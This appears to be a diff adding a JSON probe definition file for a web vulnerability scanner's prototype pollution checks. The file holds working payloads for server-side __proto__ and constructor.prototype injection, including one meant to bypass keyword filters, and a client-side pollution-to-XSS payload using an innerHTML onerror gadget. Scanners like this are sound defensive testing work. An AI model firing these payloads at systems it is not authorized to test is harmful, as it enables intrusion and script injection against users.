@@ -1,0 +1,86 @@
+{
+  "category": "prototype_pollution",
+  "contexts": {
+    "server_side": {
+      "description": "Server-side prototype pollution via JSON body — tests __proto__ and constructor.prototype injection to modify object behavior",
+      "tech_match": ["Node.js", "Express", "Koa", "Fastify", "Next.js", "NestJS"],
+      "param_match": ["__proto__", "constructor", "data", "config", "settings", "options", "merge"],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"polluted\":\"pp_canary_7x8k2\"}}",
+          "description": "Basic __proto__ pollution with canary value — if reflected in subsequent response, prototype chain is writable",
+          "matchers": [
+            {"type": "word", "words": ["pp_canary_7x8k2"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{\"__proto__\":{\"status\":510}}",
+          "description": "Prototype pollution to override HTTP status code — 510 Not Extended confirms server-side pollution",
+          "matchers": [
+            {"type": "status", "codes": [510]}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{\"constructor\":{\"prototype\":{\"polluted\":\"pp_canary_7x8k2\"}}}",
+          "description": "Constructor.prototype pollution variant — bypasses __proto__ keyword filters while achieving same effect",
+          "matchers": [
+            {"type": "word", "words": ["pp_canary_7x8k2"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        }
+      ]
+    },
+    "client_side": {
+      "description": "Client-side prototype pollution via query parameters — tests __proto__ bracket notation injection through URL params",
+      "tech_match": ["AngularJS", "jQuery", "Lodash", "Vue.js", "React"],
+      "param_match": ["__proto__", "constructor", "data", "config", "settings", "options", "merge"],
+      "probes": [
+        {
+          "payload": "?__proto__[polluted]=pp_canary_7x8k2",
+          "description": "Query param __proto__ pollution with canary — reflection confirms client-side prototype chain modification",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "?__proto__[innerHTML]=<img/src/onerror=alert(1)>",
+          "description": "Client-side prototype pollution to XSS via innerHTML gadget — onerror reflection confirms exploitable sink",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        }
+      ]
+    },
+    "detection": {
+      "description": "Generic prototype pollution detection probes — baseline comparison to detect behavioral changes from polluted prototypes",
+      "tech_match": ["Node.js", "Express", "Koa", "Fastify", "Next.js", "NestJS"],
+      "param_match": ["__proto__", "constructor", "data", "config", "settings", "options", "merge"],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"xxx\":\"yyy\"}}",
+          "description": "Minimal __proto__ injection with generic key/value — response body length difference from baseline indicates pollution side effect",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 10}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
